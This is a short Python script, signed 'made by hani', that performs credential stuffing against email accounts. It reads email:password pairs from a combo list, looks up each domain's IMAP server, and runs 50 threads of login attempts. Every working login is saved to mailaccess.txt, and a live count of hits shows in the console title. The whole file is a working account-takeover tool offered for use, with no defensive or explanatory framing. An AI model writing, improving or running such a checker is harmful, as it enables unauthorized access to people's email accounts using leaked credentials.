import imaplib, threading, socket, ctypes
print("made by hani")
combos = open("combo.txt", 'r', errors="ignore").read().splitlines()
imapsettings = [x.lower() for x in open("imapsettings.txt", 'r').read().splitlines() if len(str(x).split('|'))==2]
domains = {}
for i in imapsettings:
    domains[i.split('|')[0]] = i.split('|')[1]
def output(text):
    with open('mailaccess.txt', 'a') as outputfile:
        outputfile.write(text + '\n')
        outputfile.close()


good = 0
false = 0
def cthread():
    global good
    global false
    while len(combos)>0:
        try:
            login = combos.pop(0).split(":")
            mail = imaplib.IMAP4_SSL(domains[login[0].split("@")[1]])
            mail.login(login[0], login[1])
            mail.select()

            output(login[0] + ":" + login[1])
            good += 1
        except:
            false += 1

 
for _ in range(50):
    threading.Thread(target=cthread).start() 

from time import sleep
while True:
    sleep(0.1)
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mail access: {str(good)} | Left: {str(len(combos))}")
